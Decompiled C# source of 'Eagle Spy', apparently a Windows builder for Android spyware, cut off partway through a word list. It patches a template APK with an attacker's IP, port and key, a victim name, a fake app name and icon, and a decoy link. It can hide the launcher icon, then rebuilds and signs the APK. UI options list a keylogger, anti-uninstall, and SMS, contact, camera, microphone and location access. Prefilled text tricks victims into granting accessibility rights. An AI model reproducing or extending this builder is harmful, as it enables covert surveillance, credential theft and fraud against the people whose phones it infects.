using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml;
using DrakeUI.Framework;
using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;

namespace Eagle_Spy
{
	// Token: 0x02000060 RID: 96
	public partial class Form1 : Form
	{
		// Token: 0x06000633 RID: 1587 RVA: 0x00095C30 File Offset: 0x00093E30
		public Form1()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000634 RID: 1588 RVA: 0x000A2178 File Offset: 0x000A0378
		private async Task ExecuteCommandAsync(string command)
		{
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.Arguments = "/c " + command;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.RedirectStandardError = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.OutputDataReceived += this.OutputHandler;
			process.ErrorDataReceived += this.OutputHandler;
			process.Start();
			process.BeginOutputReadLine();
			process.BeginErrorReadLine();
			await Task.Run(delegate
			{
				process.WaitForExit();
			});
			process.Close();
		}

		// Token: 0x06000635 RID: 1589 RVA: 0x00003E1E File Offset: 0x0000201E
		private void OutputHandler(object sender, DataReceivedEventArgs e)
		{
			if (e.Data != null)
			{
				this.AppendTextToRichTextBox(e.Data);
			}
		}

		// Token: 0x06000636 RID: 1590 RVA: 0x000A21C4 File Offset: 0x000A03C4
		private void AppendTextToRichTextBox(string text)
		{
			if (base.InvokeRequired)
			{
				base.Invoke(new Action<string>(this.AppendTextToRichTextBox), new object[] { text });
				return;
			}
			this.logtext.AppendText(text + Environment.NewLine);
			this.logtext.ScrollToCaret();
			this.logtext.ScrollToCaret();
		}

		// Token: 0x06000637 RID: 1591 RVA: 0x000A2224 File Offset: 0x000A0424
		private void ReplaceTextInSmaliFiles(string directory)
		{
			string[] files = Directory.GetFiles(directory, "*.smali", SearchOption.AllDirectories);
			foreach (string text in files)
			{
				try
				{
					string text2 = File.ReadAllText(text);
					foreach (ValueTuple<string, string> valueTuple in this.replacementPairs)
					{
						text2 = text2.Replace(valueTuple.Item1, valueTuple.Item2);
					}
					File.WriteAllText(text, text2);
					this.AppendTextToRichTextBox(" Working please wait...");
				}
				catch (Exception)
				{
					this.AppendTextToRichTextBox("Something error");
				}
			}
		}

		// Token: 0x06000638 RID: 1592 RVA: 0x000A22E4 File Offset: 0x000A04E4
		private string GetIconValueFromManifest(string manifestFilePath)
		{
			string text;
			try
			{
				XmlDocument xmlDocument = new XmlDocument();
				xmlDocument.Load(manifestFilePath);
				XmlNode xmlNode = xmlDocument.SelectSingleNode("//application");
				if (xmlNode != null && xmlNode.Attributes["android:icon"] != null)
				{
					text = xmlNode.Attributes["android:icon"].Value;
				}
				else
				{
					text = "";
				}
			}
			catch (Exception)
			{
				text = "";
			}
			return text;
		}

		// Token: 0x06000639 RID: 1593 RVA: 0x000A235C File Offset: 0x000A055C
		private void ApkIconschanger()
		{
			string text = Path.Combine(new string[] { this.workdir, "temp", "res", "drawable", "developerf70.png" });
			string text2 = Path.Combine(new string[] { this.workdir, "temp", "res", "drawable", "skinicon.png" });
			if (File.Exists(text))
			{
				this.PictureBox1.Image.Save(text);
			}
			if (File.Exists(text2))
			{
				this.fakeiconpic.Image.Save(text2);
			}
		}

		// Token: 0x0600063A RID: 1594 RVA: 0x000A2408 File Offset: 0x000A0608
		private async void SelectedApk_Click(object sender, EventArgs e)
		{
			if (Directory.Exists(this.workdir))
			{
				Directory.Delete(this.workdir, true);
			}
			Directory.CreateDirectory(this.workdir);
			try
			{
				this.drakeUIButtonIcon3.Enabled = false;
				await Task.Run(delegate
				{
					ZipFile.ExtractToDirectory(this.LibZip, this.workdir);
				});
				await Task.Run(delegate
				{
					ZipFile.ExtractToDirectory(this.Apkzip, this.workdir);
				});
				this.AppendTextToRichTextBox("Extracted success");
				this.replacementPairs.Add(new ValueTuple<string, string>("NOTIFICATION_TITLE", this.Nottitle.Text));
				this.replacementPairs.Add(new ValueTuple<string, string>("NOTIFICATION_MSG", this.Notmsg.Text));
				this.replacementPairs.Add(new ValueTuple<string, string>("https://bing.com", this.Textfakelink.Text));
				this.replacementPairs.Add(new ValueTuple<string, string>("MjE2LjEwNy4xMzYuMjQ=", Convert.ToBase64String(Encoding.UTF8.GetBytes(this.TextIP.Text))));
				this.replacementPairs.Add(new ValueTuple<string, string>("Nzc3MQ==", Convert.ToBase64String(Encoding.UTF8.GetBytes(this.po.Text))));
				this.replacementPairs.Add(new ValueTuple<string, string>("CLIENT", this.TextNameVictim.Text));
				this.replacementPairs.Add(new ValueTuple<string, string>("U2lsZW50U3B5", Convert.ToBase64String(Encoding.UTF8.GetBytes(this.key.Text))));
				this.replacementPairs.Add(new ValueTuple<string, string>("[EAGLE_PACKAGE_NAME]", "com." + this.package1.Text + "." + this.package2.Text));
				this.replacementPairs.Add(new ValueTuple<string, string>("[EAGLE2_PACK2]", "com." + this.package1.Text));
				this.replacementPairs.Add(new ValueTuple<string, string>("[EAGLE3_PACK3]", "com/" + this.package1.Text));
				if (this.verswitch.Checked)
				{
					File.WriteAllText(this.ymlpath, File.ReadAllText(this.ymlpath).Replace("29", "22"));
				}
				if (this.hidecheck.Checked)
				{
					File.WriteAllText(this.manifestFilePath, File.ReadAllText(this.manifestFilePath).Replace("LAUNCHER", "INFO"));
				}
				File.WriteAllText(this.manifestFilePath, File.ReadAllText(this.manifestFilePath).Replace("[FAKE_NAME2]", this.Textfakename.Text));
				File.WriteAllText(this.namestringpath, File.ReadAllText(this.namestringpath).Replace("[ORIGINAL_AX]", this.TextNamePatch.Text));
				File.WriteAllText(this.accessbility, File.ReadAllText(this.accessbility).Replace("[EAGLE_ACCESS_APP]", this.TextNamePatch.Text));
				File.WriteAllText(this.accessbility, File.ReadAllText(this.accessbility).Replace("[EAGLE_ACCESS_DESC]", this.guna2TextBox7.Text));
				File.WriteAllText(this.accessbility, File.ReadAllText(this.accessbility).Replace("[ACCESS_ENABLE]", this.guna2TextBox8.Text));
				File.WriteAllText(this.loading, File.ReadAllText(this.loading).Replace("[EAGLE_LOAD_APP]", this.TextNamePatch.Text));
				File.WriteAllText(this.loading, File.ReadAllText(this.loading).Replace("2023", "2024"));
				File.WriteAllText(this.manifestFilePath, File.ReadAllText(this.manifestFilePath).Replace("[EAGLE_PACKAGE_NAME]", "com." + this.package1.Text + "." + this.package2.Text));
				File.WriteAllText(this.manifestFilePath, File.ReadAllText(this.manifestFilePath).Replace("[EAGLE2_PACK2]", "com." + this.package1.Text));
				string text = "C:\\ApkBuilder\\Work\\temp";
				this.ReplaceTextInSmaliFiles(text);
				this.AppendTextToRichTextBox("please wait...");
				this.ApkIconschanger();
				string text2 = "C:\\ApkBuilder\\Work\\temp\\smali\\com\\" + this.package1.Text;
				DirectoryInfo directoryInfo = new DirectoryInfo("C:\\ApkBuilder\\Work\\temp\\smali\\com\\eagle");
				new DirectoryInfo(text2);
				if (directoryInfo.Exists)
				{
					directoryInfo.MoveTo(text2);
				}
				else
				{
					this.AppendTextToRichTextBox("Error to rename package");
				}
				string tempbuildpath = "C:\\ApkBuilder\\Work\\temp\\dist\\temp.apk";
				await this.ExecuteCommandAsync("cd " + this.workdir + " && java -jar apktool.jar b -f temp");
				await this.ExecuteCommandAsync(string.Concat(new string[] { "cd ", this.workdir, " && java -jar signer.jar -a ", tempbuildpath, "  --allowResign" }));
				string text3 = "C:\\ApkBuilder\\Output\\" + this.TextNamePatch.Text + ".apk";
				string text4 = "C:\\ApkBuilder\\Output";
				if (Directory.Exists(text4))
				{
					Directory.Delete(text4, true);
				}
				Directory.CreateDirectory(text4);
				File.Move("C:\\ApkBuilder\\Work\\temp\\dist\\temp-aligned-debugSigned.apk", text3);
				if (Directory.Exists(this.workdir))
				{
					Directory.Delete(this.workdir, true);
				}
				if (File.Exists(text3))
				{
					Process.Start(text4);
				}
				this.drakeUIButtonIcon3.Enabled = true;
				tempbuildpath = null;
			}
			catch (Exception)
			{
				this.AppendTextToRichTextBox("Dependencies files missing Error");
			}
		}

		// Token: 0x0600063B RID: 1595 RVA: 0x00003E34 File Offset: 0x00002034
		private void Form1_FormClosing(object sender, FormClosingEventArgs e)
		{
			if (Directory.Exists(this.workdir))
			{
				Directory.Delete(this.workdir, true);
			}
		}

		// Token: 0x0600063C RID: 1596 RVA: 0x00002423 File Offset: 0x00000623
		private void drakeUITextBox3_TextChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x0600063D RID: 1597 RVA: 0x000A2440 File Offset: 0x000A0640
		private void DisplayRandomText()
		{
			Random random = new Random();
			int num = random.Next(this.randomTexts.Count);
			int num2 = random.Next(this.randomTexts.Count);
			this.package1.Text = this.randomTexts[num];
			this.package2.Text = this.randomTexts[num2];
		}

		// Token: 0x0600063E RID: 1598 RVA: 0x00003E4F File Offset: 0x0000204F
		private void Form1_Load(object sender, EventArgs e)
		{
			this.UpdateLanguage();
			this.DisplayRandomText();
			this.DisplayIPv4Address();
		}

		// Token: 0x0600063F RID: 1599 RVA: 0x00003E63 File Offset: 0x00002063
		private void drakeUIAvatar3_Click(object sender, EventArgs e)
		{
			this.DisplayRandomText();
		}

		// Token: 0x06000640 RID: 1600 RVA: 0x000A24A8 File Offset: 0x000A06A8
		private void drakeUIButtonIcon2_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Title = "Select Image File";
			openFileDialog.Filter = "Image Files (*.png)|*.png";
			openFileDialog.FilterIndex = 1;
			openFileDialog.RestoreDirectory = true;
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				string fileName = openFileDialog.FileName;
				this.PictureBox1.Image = Image.FromFile(fileName);
				this.pictureBox2.Image = this.PictureBox1.Image;
			}
		}

		// Token: 0x06000641 RID: 1601 RVA: 0x000A2518 File Offset: 0x000A0718
		private void DisplayIPv4Address()
		{
			try
			{
				IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
				string text = null;
				IPAddress[] addressList = hostEntry.AddressList;
				foreach (IPAddress ipaddress in addressList)
				{
					if (ipaddress.AddressFamily == AddressFamily.InterNetwork)
					{
						text = ipaddress.ToString();
						break;
					}
				}
				if (text != null)
				{
					this.TextIP.Text = text ?? "";
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000642 RID: 1602 RVA: 0x000A2594 File Offset: 0x000A0794
		private void drakeUIButtonIcon1_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Title = "Select Image File";
			openFileDialog.Filter = "Image Files (*.png)|*.png";
			openFileDialog.FilterIndex = 1;
			openFileDialog.RestoreDirectory = true;
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				string fileName = openFileDialog.FileName;
				this.fakeiconpic.Image = Image.FromFile(fileName);
			}
		}

		// Token: 0x06000643 RID: 1603 RVA: 0x000A25EC File Offset: 0x000A07EC
		private void UpdateEnglish()
		{
			this.label37.Text = "Apk Builder";
			this.MainText.Text = "Ip Address";
			this.label5.Text = "Key";
			this.Label1.Text = "Port";
			this.Label2.Text = "Client Name";
			this.label10.Text = "Package Name";
			this.tabPage1.Text = "Information";
			this.tabPage2.Text = "Apk Customize";
			this.tabPage3.Text = "Options";
			this.tabPage4.Text = "Accessibility";
			this.tabPage8.Text = "Build Apk";
			this.drakeUIButtonIcon3.Text = "Build Apk";
			this.label38.Text = "Install";
			this.Label3.Text = "App Name";
			this.label7.Text = "App icon";
			this.label40.Text = "After Install";
			this.label29.Text = "App name";
			this.label19.Text = "App icon";
			this.label22.Text = "Webview URL";
			this.label39.Text = "Sticky Notification";
			this.Label24.Text = "Notification Title";
			this.Label25.Text = "Notification message";
			this.uninstall.Text = "Anti-Uninstall";
			this.checkkeyloger.Text = "Offline Keylogger";
			this.Checksuper.Text = "Super Mode";
			this.CheckAOX.Text = "Run in background";
			this.CheckDoze.Text = "Sticky Notification";
			this.label17.Text = "Old Apk version";
			this.label36.Text = "Send SMS";
			this.label30.Text = "Read SMS";
			this.label33.Text = "Read Call Logs";
			this.label34.Text = "Read Contacts";
			this.label35.Text = "Read Accounts";
			this.label27.Text = "Camera Access";
			this.label15.Text = "Change Wallpaper";
			this.label18.Text = "Read File manager";
			this.label8.Text = "Write File Manager";
			this.label23.Text = "make calls";
			this.label26.Text = "Location";
			this.label20.Text = "Microphone Access";
			this.guna2TextBox7.Text = "Uygulamayı kullanabilmek için ,  Adımları Uygulayın\r\n\r\n1. Etkinleştir butonuna basın\r\n2. İndirilen Uygulamalar kısmından \r\n3. Uygulamayı seçip izin verin. ";
			this.guna2TextBox8.Text = "Etkinleştir";
		}

		// Token: 0x06000644 RID: 1604 RVA: 0x000A289C File Offset: 0x000A0A9C
		private void UpdateChinese()
		{
			this.label37.Text = "Apk 构建器";
			this.MainText.Text = "IP 地址";
			this.label5.Text = "密钥";
			this.Label1.Text = "端口";
			this.Label2.Text = "客户名称";
			this.label10.Text = "包名称";
			this.tabPage1.Text = "信息";
			this.tabPage2.Text = "Apk 自定义";
			this.tabPage3.Text = "选项";
			this.tabPage4.Text = "辅助功能";
			this.tabPage8.Text = "构建 Apk";
			this.drakeUIButtonIcon3.Text = "构建 Apk";
			this.label38.Text = "安装";
			this.Label3.Text = "应用名称";
			this.label7.Text = "应用图标";
			this.label40.Text = "安装后";
			this.label29.Text = "应用名称";
			this.label19.Text = "应用图标";
			this.label22.Text = "Webview URL";
			this.label39.Text = "固定通知";
			this.Label24.Text = "通知标题";
			this.Label25.Text = "通知消息";
			this.uninstall.Text = "防卸载";
			this.checkkeyloger.Text = "离线键盘记录器";
			this.Checksuper.Text = "超级模式";
			this.CheckAOX.Text = "后台运行";
			this.CheckDoze.Text = "固定通知";
			this.label17.Text = "旧版 Apk";
			this.label36.Text = "发送短信";
			this.label30.Text = "读取短信";
			this.label33.Text = "读取通话记录";
			this.label34.Text = "读取联系人";
			this.label35.Text = "读取帐户";
			this.label27.Text = "访问相机";
			this.label15.Text = "更改壁纸";
			this.label18.Text = "读取文件管理器";
			this.label8.Text = "写入文件管理器";
			this.label23.Text = "拨打电话";
			this.label26.Text = "位置";
			this.label20.Text = "访问麦克风";
			this.guna2TextBox7.Text = "要解锁高级功能，只需按照以下步骤操作\r\n\r\n1. 单击启用按钮\r\n2. 转到下载的应用程序/服务\r\n3. 启用突出显示的应用程序";
			this.guna2TextBox8.Text = "使能够";
		}

		// Token: 0x06000645 RID: 1605 RVA: 0x000A2B4C File Offset: 0x000A0D4C
		private void UpdateRussian()
		{
			this.label37.Text = "Конструктор Apk";
			this.MainText.Text = "IP-адрес";
			this.label5.Text = "Ключ";
			this.Label1.Text = "Порт";
			this.Label2.Text = "Имя клиента";
			this.label10.Text = "Имя пакета";
			this.tabPage1.Text = "Информация";
			this.tabPage2.Text = "Настройка Apk";
			this.tabPage3.Text = "Опции";
			this.tabPage4.Text = "Доступность";
			this.tabPage8.Text = "Сборка Apk";
			this.drakeUIButtonIcon3.Text = "Сборка Apk";
			this.label38.Text = "Установка";
			this.Label3.Text = "Имя приложения";
			this.label7.Text = "Иконка приложения";
			this.label40.Text = "После установки";
			this.label29.Text = "Имя приложения";
			this.label19.Text = "Иконка приложения";
			this.label22.Text = "URL веб-просмотра";
			this.label39.Text = "Фиксированное уведомление";
			this.Label24.Text = "Заголовок уведомления";
			this.Label25.Text = "Текст уведомления";
			this.uninstall.Text = "Антивыключение";
			this.checkkeyloger.Text = "Оффлайн-ключлогер";
			this.Checksuper.Text = "Супер-режим";
			this.CheckAOX.Text = "Запуск в фоновом режиме";
			this.CheckDoze.Text = "Фиксированное уведомление";
			this.label17.Text = "Старая версия Apk";
			this.label36.Text = "Отправить SMS";
			this.label30.Text = "Читать SMS";
			this.label33.Text = "Читать журналы вызовов";
			this.label34.Text = "Читать контакты";
			this.label35.Text = "Читать аккаунты";
			this.label27.Text = "Доступ к камере";
			this.label15.Text = "Изменить обои";
			this.label18.Text = "Читать файловый менеджер";
			this.label8.Text = "Записать файловый менеджер";
			this.label23.Text = "Совершать звонки";
			this.label26.Text = "Местоположение";
			this.label20.Text = "Доступ к микрофону";
			this.guna2TextBox7.Text = "Чтобы разблокировать премиум-функции, выполните следующие шаги:\r\n\r\n1. Нажмите кнопку включения\r\n2. Перейдите в раздел Загруженные приложения / услуги\r\n3. Включите выделенное приложение";
			this.guna2TextBox8.Text = "Включить";
		}

		// Token: 0x06000646 RID: 1606 RVA: 0x000A2DFC File Offset: 0x000A0FFC
		private void UpdateLanguage()
		{
			string text = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "res", "Config", "Language.inf");
			if (File.Exists(text))
			{
				string text2 = File.ReadAllText(text);
				if (text2.Contains("English"))
				{
					this.UpdateEnglish();
					return;
				}
				if (text2.Contains("Russian"))
				{
					this.UpdateRussian();
					return;
				}
				if (text2.Contains("Chinese"))
				{
					this.UpdateChinese();
					return;
				}
				this.UpdateEnglish();
			}
		}

		// Token: 0x06000647 RID: 1607 RVA: 0x00003E6B File Offset: 0x0000206B
		private void TextNamePatch_TextChanged(object sender, EventArgs e)
		{
			this.drakeUILabel1.Text = this.TextNamePatch.Text;
		}

		// Token: 0x040006A9 RID: 1705
		private string LibZip = Application.StartupPath + "\\res\\Library\\classes3.bin";

		// Token: 0x040006AA RID: 1706
		private string Apkzip = Application.StartupPath + "\\res\\Library\\temp.zip";

		// Token: 0x040006AB RID: 1707
		private string workdir = "C:\\ApkBuilder\\Work";

		// Token: 0x040006AC RID: 1708
		private string tempapk = "C:\\ApkBuilder\\Work\\temp.apk";

		// Token: 0x040006AD RID: 1709
		private string manifestFilePath = "C:\\ApkBuilder\\Work\\temp\\AndroidManifest.xml";

		// Token: 0x040006AE RID: 1710
		private string ymlpath = "C:\\ApkBuilder\\Work\\temp\\apktool.xml";

		// Token: 0x040006AF RID: 1711
		private string namestringpath = "C:\\ApkBuilder\\Work\\temp\\res\\values\\strings.xml";

		// Token: 0x040006B0 RID: 1712
		private string accessbility = "C:\\ApkBuilder\\Work\\temp\\res\\layout\\activity_req_access.xml";

		// Token: 0x040006B1 RID: 1713
		private string loading = "C:\\ApkBuilder\\Work\\temp\\res\\layout\\loading.xml";

		// Token: 0x040006B2 RID: 1714
		[TupleElementNames(new string[] { "searchText", "replaceText" })]
		private List<ValueTuple<string, string>> replacementPairs = new List<ValueTuple<string, string>>();

		// Token: 0x040006B3 RID: 1715
		private List<string> randomTexts = new List<string>
		{
			"carriers", "carries", "carroll", "carry", "carrying", "cars", "cart", "carter", "cartoon", "cartoons",
			"cartridge", "cartridges", "cas", "casa", "case", "cases", "casey", "cash", "cashiers", "casino",
			"casinos", "casio", "cassette", "cast", "casting", "castle", "casual", "cat", "catalog", "catalogs",
			"catalogue", "catalyst", "catch", "categories", "category", "catering", "cathedral", "catherine", "catholic", "cats",
			"cattle", "caught", "cause", "caused", "causes", "causing", "caution", "cave", "cayman", "cb",
			"cbs", "cc", "ccd", "cd", "cdna", "cds", "cdt", "ce", "cedar", "ceiling",
			"celebrate", "celebration", "celebrities", "celebrity", "celebs", "cell", "cells", "cellular", "celtic", "cement",
			"cemetery", "census", "cent", "center", "centered", "centers", "central", "centre", "centres", "cents",
			"centuries", "century", "ceo", "ceramic", "ceremony", "certain", "certainly", "certificate", "certificates", "certification",
			"certified", "cest", "cet", "cf", "cfr", "cg", "cgi", "ch", "chad", "chain",
			"chains", "chair", "chairman", "chairs", "challenge", "challenged", "challenges", "challenging", "chamber", "chambers",
			"champagne", "champion", "champions", "championship", "championships", "chan", "chance", "chancellor", "chances", "change",
			"changed", "changelog", "changes", "changing", "channel", "channels", "chaos", "chapel", "chapter", "chapters",
			"char", "character", "characteristic", "characteristics", "characterization", "characterized", "characters", "charge", "charged", "charger",
			"chargers", "charges", "charging", "charitable", "charity", "charles", "charleston", "charlie", "charlotte", "charm",
			"charming", "charms", "chart", "charter", "charts", "chase", "chassis", "chat", "cheap", "cheaper",
			"cheapest", "cheat", "cheats", "check", "checked", "checking", "checklist", "checkout", "checks", "cheers",
			"cheese", "chef", "chelsea", "chem", "chemical", "chemicals", "chemistry", "chen", "cheque", "cherry",
			"chess", "chest", "chester", "chevrolet", "chevy", "chi", "chicago", "chick", "chicken", "chicks",
			"chief", "child", "childhood", "children", "childrens", "chile", "china", "chinese", "chip", "chips",
			"cho", "chocolate", "choice", "choices", "choir", "cholesterol", "choose", "choosing", "chorus", "chose",
			"chosen", "chris", "christ", "christian", "christianity", "christians", "christina", "christine", "christmas", "christopher",
			"chrome", "chronic", "chronicle", "chronicles", "chrysler", "chubby", "chuck", "church", "churches", "ci",
			"cia", "cialis", "ciao", "cigarette", "cigarettes", "cincinnati", "cindy", "cinema", "cingular", "cio",
			"cir", "circle", "circles", "circuit", "circuits", "circular", "circulation", "circumstances", "circus", "cisco",
			"citation", "citations", "cite", "cited", "cities", "citizen", "citizens", "citizenship", "city", "citysearch",
			"civic", "civil", "civilian", "civilization", "cj", "cl", "claim", "claimed", "claims", "claire",
			"clan", "clara", "clarity", "clark", "clarke", "class", "classes", "classic", "classical", "classics",
			"classification", "classified", "classifieds", "classroom", "clause", "clay", "clean", "cleaner", "cleaners", "cleaning",
			"cleanup", "clear", "clearance", "cleared", "clearing", "clearly", "clerk", "cleveland", "click", "clicking",
			"clicks", "client", "clients", "cliff", "climate", "climb", "climbing", "clinic", "clinical", "clinics",
			"clinton", "clip", "clips", "clock", "clocks", "clone", "close", "closed", "closely", "closer",
			"closes", "closest", "closing", "closure", "cloth", "clothes", "clothing", "cloud", "clouds", "cloudy",
			"club", "clubs", "cluster", "clusters", "cm", "cms", "cn", "cnet", "cnetcom", "cnn",
			"co", "coach", "coaches", "coaching", "coal", "coalition", "coast", "coastal", "coat", "coated",
			"coating", "cock", "cocks", "cod", "code", "codes", "coding", "coffee", "cognitive", "cohen",
			"coin", "coins", "col", "cold", "cole", "coleman", "colin", "collaboration", "collaborative", "collapse",
			"collar", "colleague", "colleagues", "collect", "collectables", "collected", "collectible", "collectibles", "collecting", "collection",
			"collections", "collective", "collector", "collectors", "college", "colleges", "collins", "cologne", "colombia", "colon",
			"colonial", "colony", "color", "colorado", "colored", "colors", "colour", "colours", "columbia", "columbus",
			"column", "columnists", "columns", "org", "combat", "combination", "combinations", "combine", "combined", "combines",
			"combining", "combo", "come", "comedy", "comes", "comfort", "comfortable", "comic", "comics", "coming",
			"comm", "command", "commander", "commands", "comment", "commentary", "commented", "comments", "commerce", "commercial",
			"commission", "commissioner", "commissioners", "commissions", "commit", "commitment", "commitments", "committed", "committee", "committees",
			"commodities", "commodity", "common", "commonly", "commons", "commonwealth", "communicate", "communication", "communications", "communist",
			"communities", "community", "comp", "compact", "companies", "companion", "company", "compaq", "comparable", "comparative",
			"compare", "compared", "comparing", "comparison", "comparisons", "compatibility", "compatible", "compensation", "compete", "competent",
			"competing", "competition", "competitions", "competitive", "competitors", "compilation", "compile", "compiled", "compiler", "complaint",
			"complaints", "complement", "complete", "completed", "completely", "completing", "completion", "complex", "complexity", "compliance",
			"compliant", "complicated", "complications", "complimentary", "comply", "component", "components", "composed", "composer", "composite",
			"composition", "compound", "compounds", "comprehensive", "compressed", "compression", "compromise", "computation", "computational", "compute",
			"computed", "computer", "computers", "computing", "con", "concentrate", "concentration", "concentrations", "concept", "concepts",
			"conceptual", "concern", "concerned", "concerning", "concerns", "concert", "concerts", "conclude", "concluded", "conclusion",
			"conclusions", "concord", "concrete", "condition", "conditional", "conditioning", "conditions", "condo", "condos", "conduct",
			"conducted", "conducting", "conf", "conference", "conferences", "conferencing", "confidence", "confident", "confidential", "confidentiality",
			"config", "configuration", "configure", "configured", "configuring", "confirm", "confirmation", "confirmed", "conflict", "conflicts",
			"confused", "confusion", "congo", "congratulations", "congress", "congressional", "conjunction", "connect", "connected", "connecticut",
			"connecting", "connection", "connections", "connectivity", "connector", "connectors", "cons", "conscious", "consciousness", "consecutive",
			"consensus", "consent", "consequence", "consequences", "consequently", "conservation", "conservative", "consider", "considerable", "consideration",
			"considerations", "considered", "considering", "considers", "consist", "consistency", "consistent", "consistently", "consisting", "consists",
			"console", "consoles", "consolidated", "consolidation", "consortium", "conspiracy", "const", "constant", "constantly", "constitute",
			"constitutes", "constitution", "constitutional", "constraint", "constraints", "construct", "constructed", "construction", "consult", "consultancy",
			"consultant", "consultants", "consultation", "consulting", "consumer", "consumers", "consumption", "contact", "contacted", "contacting",
			"contacts", "contain", "contained", "container", "containers", "containing", "contains", "contamination", "contemporary", "content",
			"contents", "contest", "contests", "context", "continent", "continental", "continually", "continue", "continued", "continues",
			"continuing", "continuity", "continuous", "continuously", "contract", "contracting", "contractor", "contractors", "contracts", "contrary",
			"contrast", "contribute", "contributed", "contributing", "contribution", "contributions", "contributor", "contributors", "control", "controlled",
			"controller", "controllers", "controlling", "controls", "controversial", "controversy", "convenience", "convenient", "convention", "conventional",
			"conventions", "convergence", "conversation", "conversations", "conversion", "convert", "converted", "converter", "convertible", "convicted",
			"conviction", "convinced", "cook", "cookbook", "cooked", "cookie", "cookies", "cooking", "cool", "cooler",
			"cooling", "cooper", "cooperation", "cooperative", "coordinate", "coordinated", "coordinates", "coordination", "coordinator", "cop",
			"cope", "copied", "copies", "copper", "copy", "copying", "copyright", "copyrighted", "copyrights", "coral",
			"cord", "cordless", "core", "cork", "corn", "cornell", "corner", "corners", "cornwall", "corp",
			"corporate", "corporation", "corporations", "corps", "corpus", "correct", "corrected", "correction", "corrections", "correctly",
			"correlation", "correspondence", "corresponding", "corruption", "cos", "cosmetic", "cosmetics", "cost", "costa", "costs",
			"costume", "costumes", "cottage", "cottages", "cotton", "could", "council", "councils", "counsel", "counseling",
			"count", "counted", "counter", "counters", "counties", "counting", "countries", "country", "counts", "county",
			"couple", "coupled", "couples", "coupon", "coupons", "courage", "courier", "course", "courses", "court",
			"courtesy", "courts", "cove", "cover", "coverage", "covered", "covering", "covers", "cow", "cowboy",
			"cox", "cp", "cpu", "cr", "crack", "cradle", "craft", "crafts", "craig", "crap",
			"craps", "crash", "crawford", "crazy", "cream", "create", "created", "creates", "creating", "creation",
			"creations", "creative", "creativity", "creator", "creature", "creatures", "credit", "credits", "creek", "crest",
			"crew", "cricket", "crime", "crimes", "criminal", "crisis", "criteria", "criterion", "critical", "criticism",
			"critics", "crm", "croatia", "crop", "crops", "cross", "crossing", "crossword", "crowd", "crown",
			"crucial", "crude", "cruise", "cruises", "cruz", "cry", "crystal", "cs", "css", "cst",
			"ct", "cu", "cuba", "cube", "cubic", "cuisine", "cult", "cultural", "culture", "cultures",
			"cum", "cumshot", "cumshots", "cumulative", "cunt", "cup", "cups", "cure", "curious", "currencies",
			"currency", "current", "currently", "curriculum", "cursor", "curtis", "curve", "curves", "custody", "custom",
			"customer", "customers", "customise", "customize", "customized", "customs", "cut", "cute", "cuts", "cutting",
			"cv", "cvs", "cw", "cyber", "cycle", "cycles", "cycling", "cylinder", "cyprus", "cz",
			"czech", "d", "da", "dad", "daddy", "daily", "dairy", "daisy", "dakota", "dale",
			"dallas", "dam", "damage", "damaged", "damages", "dame", "damn", "dan", "dana", "dance",
			"dancing", "danger", "dangerous", "daniel", "danish", "danny", "dans", "dare", "dark", "darkness",
			"darwin", "das", "dash", "dat", "data", "database", "databases", "date", "dated", "dates",
			"dating", "daughter", "daughters", "dave", "david", "davidson", "davis", "dawn", "day", "days",
			"dayton", "db", "dc", "dd", "ddr", "de", "dead", "deadline", "deadly", "deaf",
			"deal", "dealer", "dealers", "dealing", "deals", "dealt", "dealtime", "dean", "dear", "death",
			"deaths", "debate", "debian", "deborah", "debt", "debug", "debut", "dec", "decade", "decades",
			"december", "decent", "decide", "decided", "decimal", "decision", "decisions", "deck", "declaration", "declare",
			"declared", "decline", "declined", "decor", "decorating", "decorative", "decrease", "decreased", "dedicated", "dee",
			"deemed", "deep", "deeper", "deeply", "deer", "def", "default", "defeat", "defects", "defence",
			"defend", "defendant", "defense", "defensive", "deferred", "deficit", "define", "defined", "defines", "defining",
			"definitely", "definition", "definitions", "degree", "degrees", "del", "delaware", "delay", "delayed", "delays",
			"delegation", "delete", "deleted", "delhi", "delicious", "delight", "deliver", "delivered", "delivering", "delivers",
			"delivery", "dell", "delta", "deluxe", "dem", "demand", "demanding", "demands", "demo", "democracy",
			"democrat", "democratic", "democrats", "demographic", "demonstrate", "demonstrated", "demonstrates", "demonstration", "den", "denial",
			"denied", "denmark", "dennis", "dense", "density", "dental", "dentists", "denver", "deny", "department",
			"departmental", "departments", "departure", "depend", "dependence", "dependent", "depending", "depends", "deployment", "deposit",
			"deposits", "depot", "depression", "dept", "depth", "deputy", "der", "derby", "derek", "derived",
			"des", "descending", "describe", "described", "describes", "describing", "description", "descriptions", "desert", "deserve",
			"design", "designated", "designation", "designed", "designer", "designers", "designing", "designs", "desirable", "desire",
			"desired", "desk", "desktop", "desktops", "desperate", "despite", "destination", "destinations", "destiny", "destroy",
			"destroyed", "destruction", "detail", "detailed", "details", "detect", "detected", "detection", "detective", "detector",
			"determination", "determine", "determined", "determines", "determining", "detroit", "deutsch", "deutsche", "deutschland", "dev",
			"devel", "develop", "developed", "developer", "developers", "developing", "development", "developmental", "developments", "develops",
			"deviant", "deviation", "device", "devices", "devil", "devon", "devoted", "df", "dg", "dh",
			"di", "diabetes", "diagnosis", "diagnostic", "diagram", "dial", "dialog", "dialogue", "diameter", "diamond",
			"diamonds", "diana", "diane", "diary", "dice", "dick", "dicke", "dicks", "dictionaries", "dictionary",
